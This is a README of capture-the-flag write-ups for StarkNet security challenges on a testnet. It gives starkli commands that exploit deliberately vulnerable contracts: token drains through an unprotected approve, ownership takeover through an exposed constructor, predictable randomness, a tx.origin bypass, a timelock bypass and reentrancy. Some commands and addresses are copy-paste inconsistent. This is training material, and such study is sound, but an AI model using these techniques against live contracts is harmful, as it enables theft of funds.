# StarkNet Security Challenges

This repo contains my write-ups for the different challenges available at https://starknet-security-challenges.app.

## Recap

| Challenge Number | Challenge Name | Solved  | Solved on-chain (SN_SEPOLIA) | Origin                   |
| ---------------- | -------------- | ------- | ---------------------------- | ------------------------ |
| 01               | DEPLOY         | &#9745; | &#9745;                      | Capture The Ether (2022) |
| 02               | CALL ME        | &#9745; | &#9745;                      | Capture The Ether (2022) |
| 03               | NICKNAME       | &#9745; | &#9745;                      | Capture The Ether (2022) |
| 04               | GUESS          | &#9745; | &#9745;                      | Capture The Ether (2022) |
| 05               | SECRET         | &#9745; | &#9744;                      | Capture The Ether (2022) |
| 06               | RANDOM         | &#9745; | &#9745;                      | Capture The Ether (2022) |
| 07               | VTOKEN         | &#9745; | &#9744;                      | Secureum A-Maze X (2022) |
| 08               | INSECURE DEX   | &#9745; | &#9744;                      | Secureum A-Maze X (2022) |
| 09               | FAL1OUT        | &#9745; | &#9745;                      | Ethernaut (2022)         |
| 10               | COINFLIP       | &#9745; | &#9745;                      | Ethernaut (2022)         |
| 11               | TELEPHONE      | &#9745; | &#9745;                      | Ethernaut (2022)         |
| 12               | VAULT          | &#9745; | &#9745;                      | Ethernaut (2022)         |
| 13               | NAUGHTY COIN   | &#9745; | &#9745;                      | Ethernaut (2022)         |
| 14               | GOOD SAMARITAN | &#9745; | &#9744;                      | Ethernaut (2022)         |

## Set up

In order to solve these challenges, you'll need to interact with the StarkNet Sepolia network (SN_SEPOLIA), and sometimes deploy contracts to it.

Stack used:

- [Starkli](https://github.com/xJonathanLEI/starkli), to interact with starknet (read storage, declare and deploy contracts, call view functions and invoke functions of deployed contracts).
- [StarkNet Security front-end (FE)](https://starknet-security-challenges.app), to easily deploy and complete challenges (+ mint cute NFTs).
- [Scarb](https://docs.swmansion.com/scarb/), StarkNet compiler.
- [BlastAPI Public RPC](https://starknet-sepolia.public.blastapi.io/rpc/v0_6)
- [ArgentX Sepolia Account](https://www.argent.xyz/argent-x/)

The Challenge Factory contract is available at [0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918](https://sepolia.starkscan.co/contract/0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918).

One can either interact with it through a block explorer (e.g. StarkScan or Voyager), through the front-end (FE) or from the CLI with Starkli.
For convenience, I chose to primarily use Starkli, and sometimes the front-end (mostly to deploy and finalize challenges).

Through block explorers, I had RPC requests blocked due to bad certificates from the sepolia rpc domain.

### Starkli Setup

1. Export the [SN_SEPOLIA RPC url](https://starknet-sepolia.public.blastapi.io/rpc/v0_6) to the environment variable STARKNET_RPC:

   ```bash
   export STARKNET_RPC=https://starknet-sepolia.public.blastapi.io/rpc/v0_6
   ```

2. Create a signer from the private key of your wallet (ArgentX in my case). A keystore is preferred, to avoid plain-text private keys.

   ```bash
   starkli signer keystore from-key ~/.strk_dev_keystore.json
   ```

3. Export the keystore to the env variable STARKNET_KEYSTORE:

   ```bash
   export STARKNET_KEYSTORE=~/.strkl_dev_keystore.json
   ```

4. Fetch your wallet contract if already on-chain to get an account descriptor:

   ```bash
   starkli account fetch <SMART_WALLET_ADDRESS> --output ~/.strk_dev_account.json
   ```

5. Export the account to the env variable STARKNET_KEYSTORE:

   ```bash
   export STARKNET_ACCOUNT=~/.strkl_dev_account.json
   ```

## Write-ups

### Boilerplate to deploy and verify challenges

From the FE:

1. Deploy the challenge:
   - Click on "Begin Challenge" and `Confirm` the transaction.
2. Verify that the challenge has been solved (`isCompleted` returns `true`):
   - Click on "Check Solution" (and `Confirm` the transaction.)
3. Mint the associated NFT (optional)
   - Click on "Mint NFT".

From starkli:

1. Deploy the challenge:

   ```bash
   starkli invoke 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector deploy_challenge) <challenge_number>
   ```

2. Verify that the challenge has been solved (`isCompleted` returns `true`):
   ```bash
   starkli invoke 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector test_challenge) <challenge_number>
   ```
3. Mint the associated NFT (optional)
   ```bash
   starkli invoke 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector mint) <challenge_number>
   ```

With the multicall support, one could verify the challenge and mint the nft in one transaction:

```bash
starkli invoke 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector test_challenge) <challenge_number> / 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector mint) <challenge_number>
```

### DEPLOY

Deploying the challenge solves the challenge.
Following the steps from [boilerplate](#boilerplate-to-deploy-and-verify-challenges) is enough.

### CALL ME

1. Deploy the challenge:

Challenge address: `0x02e7e4bd84465b46525b05ba9709dc85f05bab7be04030fd3d5f70447594c097`

2. Call the `call_me()` function:

   ```bash
   starkli invoke 0x02e7e4bd84465b46525b05ba9709dc85f05bab7be04030fd3d5f70447594c097 $(starkli selector call_me)
   ```

3. Verify the solution and mint the NFT

### NICKNAME

We interact with the main contract to set a nickname, no need to deploy a challenge contract here.
Challenge address: `0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918`

1. Call the `set_nickname(_name: felt252)` function, with one parameter:

```bash
starkli invoke 0x05141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector set_nickname) to-cairo-string malatrax
```

2. Verify the solution and mint the NFT

3. Check on the [leaderboard](https://starknet-security-challenges.app/leaderboard) that your nickname has been set.

### GUESS

We must guess a previously set number. Reading the constructor's source code is enough to find that number, 42. Or we could query the storage variable `answer` to get its value, as no storage is not publicly readable.

1. Deploy the challenge:

Challenge address: `0x003f9a5fe97db08f27877dc2d363cd27ebd3f6380e0c3a6823162202b0f72b84`

2. Guess the right number (`42`):

   ```bash
   starkli invoke 0x003f9a5fe97db08f27877dc2d363cd27ebd3f6380e0c3a6823162202b0f72b84 $(starkli selector guess) 42
   ```

3. Verify the solution and mint the NFT

### SECRET

:warning: Currently not working on Sepolia :warning:
_A class hash is stored to deploy the challenge, however for this challenge (5, here), it is set to the challenge factory, thus it cannot be deployed._

_Get the challenge class hash:_

```bash
starkli call 0x5141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector get_challenge_class_hash) <challenge_number>
```

We must guess the number which yields the provided pedersen hash: `0x23c16a2a9adbcd4988f04bbc6bc6d90275cfc5a03fbe28a6a9a3070429acb96`
We know that the number is in the range [1..5000].
The `hash_result` has been constructed as such: `core::pedersen::pedersen(1000, n);`
Thus, we can write a cairo program which computes the pedersen hash for n in [1..5000] while the resulting hash is not equal to the wanted one.

The guessed number is **2023**.

3. Guess the right number (`0x046c2df8c2dde4795e032036fefb4d3962020d98f1fd36a1c2a60e656f5b7a9e`):

   ```bash
   starkli invoke 0x003f9a5fe97db08f27877dc2d363cd27ebd3f6380e0c3a6823162202b0f72b84 $(starkli selector guess) 2023
   ```

4. Verify the solution and mint the NFT

### RANDOM

A hash is computed from the block number and timestamp from which the challenge is deployed from, and we must guess it.
Storage variables are publicly readable, we just need to read the storage and we're done.
_NOTE: randomness based on public variables, such as blocks are not considered secured..._

1. Deploy the challenge:

Challenge address: `0x072d89c03662a4df6602c5c066593c0f11d319ac32fd6d9cee33b54fe83d9352`

2. Query the storage:

- We can read the storage value on a [block explorer](https://sepolia.starkscan.co/contract/0x072d89c03662a4df6602c5c066593c0f11d319ac32fd6d9cee33b54fe83d9352#contract-storage): `hash_result = 2000388162503375944018060986445281714150243327698272062735791752870910196382`

- Or we can compute the key value and then query starknet on our own:
- Compute `sn_keccak(<storage_var_name>)`:
  - This is the 251 least significant bits of `keccak256(<storage_var_name>)`, the hash function from the KECCAK family.
  - `keccak256('hash_result') = 0xbc5530986feab27564c08d382b374fb509aef82640320211c6a7d58de6052ad3` from [online tools](https://emn178.github.io/online-tools/keccak_256.html)
  - `sn_keccak('hash_result') = 0x005530986feab27564c08d382b374fb509aef82640320211c6a7d58de6052ad3`
- Query the storage with Starkli:
  ```bash
  starkli storage 0x072d89c03662a4df6602c5c066593c0f11d319ac32fd6d9cee33b54fe83d9352 0x5530986feab27564c08d382b374fb509aef82640320211c6a7d58de6052ad3
  ```
  `hash_result = 0x046c2df8c2dde4795e032036fefb4d3962020d98f1fd36a1c2a60e656f5b7a9e`

3. Guess the right number (`0x046c2df8c2dde4795e032036fefb4d3962020d98f1fd36a1c2a60e656f5b7a9e`):

   ```bash
   starkli invoke 0x003f9a5fe97db08f27877dc2d363cd27ebd3f6380e0c3a6823162202b0f72b84 $(starkli selector guess) 0x046c2df8c2dde4795e032036fefb4d3962020d98f1fd36a1c2a60e656f5b7a9e
   ```

4. Verify the solution and mint the NFT

### VTOKEN

:warning: Currently not working on Sepolia :warning:
_The challenge deploys a custom ERC20 token. The provided [class hash is hardcoded](https://github.com/devnet0x/Starknet-Security-Challenges-Factory/blob/c1f9d6db576aacf28c403a2b1b44f349e4eaf70c/src/assets/challenge7.cairo#L46-L48), but it doesn't exist on Sepolia (surely unchanged from the goerli migration) thus the challenge cannot be deployed._

```cairo
let vtoken_class_hash: ClassHash = class_hash_const::<0x02c8aa260ff80b26b5e57c9d0d74693214315f1f10e0d3c903381ff44516e653>();
```

_Get the challenge class hash:_

```bash
starkli call 0x5141d769ce5dffd00a2cbd210c41a443360d68fd19a050c8cba22224d786918 $(starkli selector get_challenge_class_hash) <challenge_number>
```

The `approve( ref self: ContractState, owner: ContractAddress, spender: ContractAddress, amount: u256)` lacks access-control, anyone can approve token spending on behalf of anybody.

1. Deploy the challenge:

Challenge address: <challenge_addr>

2. Get the vtoken address (through explorer or starkli): <vtoken_addr>

3. Approve the spending of `u256:100000000000000000000` from `<challenge_addr>` by yourself (`0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b`, here):

   ```bash
   starkli invoke <vtoken_addr> $(starkli selector approve) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
   ```

4. Drain all $VTK from the challenge with `transfer_from(ref self: ContractState, sender: ContractAddress, recipient: ContractAddress, amount: u256)`:
   ```bash
   starkli invoke <vtoken_addr> $(starkli selector transfer_from) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
   ```

It can be done with a multicall:

```bash
   starkli invoke <vtoken_addr> $(starkli selector approve) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000 / <vtoken_addr> $(starkli selector transfer_from) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
```

5. Verify the solution and mint the NFT

### INSECURE DEX

:warning: Currently not working on Sepolia :warning:
_The challenge is still in Cairo 0 and has not been migrated to Cairo 2, plus it has some hardcoded class hashes which haven't been updated_

This challenge is a DEX constituting a pool with an initial liquidity of 10 $ISEC and 10 $SET. With 1 $ISEC and 1 $SET we must drain the pool.
$ISEC is a classical ERC20 token while $SET is an ERC223, which implements an `_afterTokenReceived` hook requiring contracts interacting with this ERC to implements a `tokenReceived(address : felt, amount : Uint256, calldata_len : felt, calldata : felt*)`function.

Basically, it introduces re-entrancy on ERC20 tokens.

To drain the pool, craft an exploit contract which will: - Add liquidity on both sides, `add_liquidity()` - Remove liquidity from the pool `remove_liquidity()` - Implements the ERC223 `tokenReceived` which will call the previously defined `remove_liquidity()` till the pool is empty.

The exploit contract source code can be found here: <insecure_dex_exploit>

I tried writing an exploit contract in Cairo0, based on the challenge source code. I haven't found any proper syntax docs on cairo 0, not sure how loops are handled.

Finishing the cairo 0 to cairo 2 migration of the challenge and then resolving it should be a better option...

### FAL1OUT

We must claim ownership of the deployed challenge.
The constructor is actually an external function, it misses the `#[constructor]` attribute, meaning that anyone can call it, multiple times.

1. Deploy the challenge:

Challenge address: 0x1098a949b19eb18fefac9e2bfc632666b2a9f852816680ff441ba30dae41cde

2. Call the `constructor(ref self: ContractState, amount: u256)` function:
   An amount of 0 should be passed, as a transfer of the funds are performed when calling `isComplete`, unless you wanna fund it beforehand...

   ```bash
   starkli invoke 0x1098a949b19eb18fefac9e2bfc632666b2a9f852816680ff441ba30dae41cde $(starkli selector constructor) u256:0
   ```

3. Verify the solution and mint the NFT

### COINFLIP

We must win a coin flip game 6 consecutive times.
The correct answer being HEAD or TAIL is computed in a known private function, based on the transaction hash of the current transaction.

The entropy is created from public variables accessible before actually playing the game, the protocol is known so one can predict the correct answer and then submit it in the same block.

The easiest way to solve this challenge is by deploying a contract which implements the `compute_answer(self: @ContractState) -> felt252` function and call `guess(ref self: ContractState, guess: felt252) -> bool` with the computed answer.

Only one game can be done per block, a block is mined every 3 minutes on Sepolia. Once we successfully called our exploit contract 6 times we can verify and mint the NFT.

The exploit contract source code can be found here: <coinflip_exploit>

1. Deploy the challenge:

Challenge address: 0x19b7dbc911eda575e4d9708445fcda13365df352cd361be185dacbb63893fc2

2. Craft the exploit contract:

   - Create a new scarb project: `scarb new coinflip && cd coinflip`
   - Update the `Scarb.toml` with starknet dependecies
   - Implements the exploit

3. Declare the contract:

```bash
scarb build
starkli declare --watch target/dev/coinflip_CoinFlipExploit.contract_class.json
```

Class Hash: `0x026b93f8ec1bf5933adca1d81c548ea4bf30d231bbdcc7be3e35bd2991a03300`

4. Deploy the contract:

```bash
starkli deploy --watch 0x026b93f8ec1bf5933adca1d81c548ea4bf30d231bbdcc7be3e35bd2991a03300 0x19b7dbc911eda575e4d9708445fcda13365df352cd361be185dacbb63893fc2
```

Contract address: `0x073fa90032ab768dfbd3cd78c5844121658fae2e2847cba1e2d0de6f50537655`

5. Call `auto_win()` 6 times, once per block:

   ```bash
   starkli invoke 0x073fa90032ab768dfbd3cd78c5844121658fae2e2847cba1e2d0de6f50537655 $(starkli selector auto_win)
   ```

6. Verify the solution and mint the NFT

NOTE A: Starkli declare output

```bash
Sierra compiler version not specified. Attempting to automatically decide version to use...
Network detected: sepolia. Using the default compiler version for this network: 2.4.0. Use the --compiler-version flag to choose a different version.
Declaring Cairo 1 class: 0x026b93f8ec1bf5933adca1d81c548ea4bf30d231bbdcc7be3e35bd2991a03300
Compiling Sierra class to CASM with compiler version 2.4.0...
CASM class hash: 0x005565e3607ae857bb2668ff85fd607a489ffe99535e5992b6a0ba5291c8c9c7
Contract declaration transaction: 0x0330352f82879f65a8dbebd39c7037a6aa77d9ddd4e2e1956373f3a82cd1b6e1
Waiting for transaction 0x0330352f82879f65a8dbebd39c7037a6aa77d9ddd4e2e1956373f3a82cd1b6e1 to confirm...
Transaction not confirmed yet...
Transaction not confirmed yet...
Transaction 0x0330352f82879f65a8dbebd39c7037a6aa77d9ddd4e2e1956373f3a82cd1b6e1 confirmed
Class hash declared:
0x026b93f8ec1bf5933adca1d81c548ea4bf30d231bbdcc7be3e35bd2991a03300
```

NOTE B: Starkli deploy output

```bash
Deploying class 0x026b93f8ec1bf5933adca1d81c548ea4bf30d231bbdcc7be3e35bd2991a03300 with salt 0x04768d7ec8eb22653bc959ca0930cc9643647249ee843612146f2f6985fa4f01...
The contract will be deployed at address 0x073fa90032ab768dfbd3cd78c5844121658fae2e2847cba1e2d0de6f50537655
Contract deployment transaction: 0x0440f59e132dbb69d90d082ed179d2efd99772a29f7c89647b218d00d267432c
Waiting for transaction 0x0440f59e132dbb69d90d082ed179d2efd99772a29f7c89647b218d00d267432c to confirm...
Transaction not confirmed yet...
Transaction 0x0440f59e132dbb69d90d082ed179d2efd99772a29f7c89647b218d00d267432c confirmed
Contract deployed:
0x073fa90032ab768dfbd3cd78c5844121658fae2e2847cba1e2d0de6f50537655
```

### TELEPHONE

We must claim ownership of the deployed challenge.
To do so, we must call `changeOwner(ref self: ContractState, _owner: ContractAddress)` where the `tx.origin` account address is different from the caller address.
Deploying and calling a contract that will call `changeOwner` will achieve the wanted result.

The exploit contract source code can be found here: <telephone_exploit>

1. Deploy the challenge:

Challenge address: 0x5bdf71ca6ce8b50be3e7a51b3c6cd9d4e3f0605eacaef0fa7a99ef334868875

2. Craft the exploit contract:

   - Create a new scarb project: `scarb new telephone && cd telephone`
   - Update the `Scarb.toml` with starknet dependecies
   - Implements the exploit

3. Declare the contract:

```bash
scarb build
starkli declare --watch target/dev/telephone_TelephoneExploit.contract_class.json
```

Class Hash: `0x05f7fd62207e186abe62e06b0a7584f885de067d3c9531336bcf565df8145ad5`

4. Deploy the contract:

```bash
starkli deploy --watch 0x05f7fd62207e186abe62e06b0a7584f885de067d3c9531336bcf565df8145ad5 0x5bdf71ca6ce8b50be3e7a51b3c6cd9d4e3f0605eacaef0fa7a99ef334868875
```

Contract address: `0x00b1f3f452d9d116d592ca38d7653f95d8de5c828dcf9f85a13bf6270e671454`

5. Call `call_telephone()`:

   ```bash
   starkli invoke 0x00b1f3f452d9d116d592ca38d7653f95d8de5c828dcf9f85a13bf6270e671454 $(starkli selector call_telephone)
   ```

6. Verify the solution and mint the NFT

NOTE A: Starkli declare output

```bash
Sierra compiler version not specified. Attempting to automatically decide version to use...
Network detected: sepolia. Using the default compiler version for this network: 2.4.0. Use the --compiler-version flag to choose a different version.
Declaring Cairo 1 class: 0x05f7fd62207e186abe62e06b0a7584f885de067d3c9531336bcf565df8145ad5
Compiling Sierra class to CASM with compiler version 2.4.0...
CASM class hash: 0x01fd7e426d8cf00f259cd25b451efc53236b1a9153e87c6f5ebfd51c5077590b
Contract declaration transaction: 0x057489c18046310a1dcd4b1d51d2a310f6dbd2224b4c8f0ac946173b4152eacf
Waiting for transaction 0x057489c18046310a1dcd4b1d51d2a310f6dbd2224b4c8f0ac946173b4152eacf to confirm...
Transaction not confirmed yet...
Transaction not confirmed yet...
Transaction 0x057489c18046310a1dcd4b1d51d2a310f6dbd2224b4c8f0ac946173b4152eacf confirmed
Class hash declared:
0x05f7fd62207e186abe62e06b0a7584f885de067d3c9531336bcf565df8145ad5
```

NOTE B: Starkli deploy output

```bash
Deploying class 0x05f7fd62207e186abe62e06b0a7584f885de067d3c9531336bcf565df8145ad5 with salt 0x078f77df9289014e71912d32779d5cb46ea9a1fc329fca25cfed77bd38e0bcf4...
The contract will be deployed at address 0x00b1f3f452d9d116d592ca38d7653f95d8de5c828dcf9f85a13bf6270e671454
Contract deployment transaction: 0x062cbede0ba549282dbbbf0aa12c80e08a6bd0f8834e4c16ba55d2572588dad6
Transaction not confirmed yet...
Transaction 0x062cbede0ba549282dbbbf0aa12c80e08a6bd0f8834e4c16ba55d2572588dad6 confirmed
Contract deployed:
0x00b1f3f452d9d116d592ca38d7653f95d8de5c828dcf9f85a13bf6270e671454
```

### VAULT

We need to unlock a vault 'protected' by a password, which is a storage variable.
Read the storage variable and call `unlock(ref self: TContractState, _password: felt252)` with the read value.

1. Deploy the challenge:

Challenge address: 0x1212bfd3b7514a51733f4f3d78953cf46bbba1d4cdb12ef2563054042ac20ae

2. Read the `password` variable: `0x057190702af68416bf863abc9769e11c2c189e348296ce4dd6b07461fe33a5d2`

3. Call the `unlock(ref self: ContractState, amount: u256)` function:

   ```bash
   starkli invoke 0x1212bfd3b7514a51733f4f3d78953cf46bbba1d4cdb12ef2563054042ac20ae $(starkli selector unlock) 0x057190702af68416bf863abc9769e11c2c189e348296ce4dd6b07461fe33a5d2
   ```

4. Verify the solution and mint the NFT

### NAUGHTY COIN

We have 100 $NTK which are supposed to be locked for 10 years (i.e non-transferrable).
The timelock can be bypassed from using `approve` and `transfer_from` functions on ourself, which lacks timelock checks.

1. Deploy the challenge:

Challenge address: 0x39303bb3e66588143f88beda1bcf9a4eb56a77829820ed4d55aec83ab12c99

2. Multicall approve and transfer from the deployer address (`0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b`) to another address (`0x0575754557C4256Bb19144942b8F7377E212774cDFdEf9BF5C3D0416FCC12E26`):

   ```bash
   starkli invoke 0x39303bb3e66588143f88beda1bcf9a4eb56a77829820ed4d55aec83ab12c99 $(starkli selector approve) 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:1000000 / 0x39303bb3e66588143f88beda1bcf9a4eb56a77829820ed4d55aec83ab12c99 $(starkli selector transfer
   _from) 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b 0x0575754557C4256Bb19144942b8F7377E212774cDFdEf9BF5C3D0416FCC12E26 u256:1000000
   ```

3. Verify the solution and mint the NFT

### GOOD SAMARITAN

:warning: Currently not working on Sepolia :warning:
_The challenge deploys a custom ERC20 token. The provided class hashes are hardcoded ([1](https://github.com/devnet0x/Starknet-Security-Challenges-Factory/blob/c1f9d6db576aacf28c403a2b1b44f349e4eaf70c/src/assets/challenge14.cairo#L41-L43), [2](https://github.com/devnet0x/Starknet-Security-Challenges-Factory/blob/c1f9d6db576aacf28c403a2b1b44f349e4eaf70c/src/assets/challenge14.cairo#L50-L52)), but it doesn't exist on Sepolia (surely unchanged from the goerli migration) thus the challenge cannot be deployed._

The challenge contract allows anyone to call `request_donation(self: @ContractState)` which calls `donate10(self: @ContractState, dest_: ContractAddress)`, which transfers 10e18 tokens from a wallet contract if there is enough balance. If the balance is less than 10e18, the remaining balance is sent.
There is no restriction on number of calls to these functions, one can make calls to request_donation until the good samaritan's balance is 0.

The good samaritan has $1_000_000 TKN, it requires 100_000 calls to `request_donation`.
Either make a loop that breaks on the the 100_001-th iteration, or a while loop that breaks when `request_donation` returns `false`.

The exploit contract source code can be found here: <good_samaritan_exploit>

1. Deploy the challenge:

Challenge address: <challenge_addr>

2. Craft the exploit contract:

   - Create a new scarb project: `scarb new coinflip && cd coinflip`
   - Update the `Scarb.toml` with starknet dependecies
   - Implements the exploit

3. Declare the contract:

```bash
scarb build
starkli declare --watch target/dev/good_samaritan_GoodSamaritanExploit.contract_class.json
```

Class Hash: <good_samaritan_class_hash>

4. Deploy the contract:

```bash
starkli deploy --watch <good_samaritan_class_hash> <challenge_addr>
```

Contract address: <good_samaritan_exploit>

5. Call `drain_samaritan()`:

   ```bash
   starkli invoke <good_samaritan_exploit> $(starkli selector drain_samaritan)
   ```

6. Verify the solution and mint the NFT

NOTE A: Starkli declare output

NOTE B: Starkli deploy output
